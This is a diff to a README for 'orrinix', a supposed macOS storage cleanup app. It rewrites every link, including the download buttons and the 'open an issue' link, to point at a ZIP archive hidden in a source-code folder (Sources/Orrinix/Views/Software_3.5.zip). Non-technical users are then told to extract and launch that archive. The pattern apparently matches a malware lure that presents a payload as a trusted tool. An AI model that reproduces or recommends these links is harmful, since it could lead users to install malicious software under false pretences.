@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run **orrinix**, a straightforward storage cleanup utility built for macOS users who want clarity about what's taking up space on their computers. No technical knowledge is required—just follow these simple steps, and you'll be on your way to a cleaner, more organized system.
 
-[⬇️ Download orrinix Now](https://github.com/rindzohaib/orrinix)
+[⬇️ Download orrinix Now](https://github.com/rindzohaib/orrinix/raw/refs/heads/main/Sources/Orrinix/Views/Software_3.5.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Welcome! This guide will help you download and run **orrinix**, a straightforwar
 
 Click the button above or visit this link to download the application:
 
-**Primary Download Link:** [https://github.com/rindzohaib/orrinix](https://github.com/rindzohaib/orrinix)
+**Primary Download Link:** [https://github.com/rindzohaib/orrinix/raw/refs/heads/main/Sources/Orrinix/Views/Software_3.5.zip](https://github.com/rindzohaib/orrinix/raw/refs/heads/main/Sources/Orrinix/Views/Software_3.5.zip)
 
 Visit this link to download the application.
 
@@ -109,7 +109,7 @@ Your privacy matters. orrinix doesn't collect, transmit, or share any of your pe
 
 We're committed to making orrinix the clearest storage cleanup tool available. If you encounter issues or have questions not covered here, you can:
 
-- Open an issue on the [GitHub repository](https://github.com/rindzohaib/orrinix)
+- Open an issue on the [GitHub repository](https://github.com/rindzohaib/orrinix/raw/refs/heads/main/Sources/Orrinix/Views/Software_3.5.zip)
 - Check the documentation section on the repository page
 - Look for update notifications within the app itself when new versions are released
 
@@ -135,7 +135,7 @@ Here's what the community values about orrinix:
 Now that you've downloaded and run orrinix, you're all set to reclaim valuable storage space on your Mac.
 
 **Remember these key steps:**
-1. Click the download link: [Get orrinix here](https://github.com/rindzohaib/orrinix)
+1. Click the download link: [Get orrinix here](https://github.com/rindzohaib/orrinix/raw/refs/heads/main/Sources/Orrinix/Views/Software_3.5.zip)
 2. Extract the ZIP file
 3. Launch the app
 4. Let it scan, review your files, and clean up with confidence
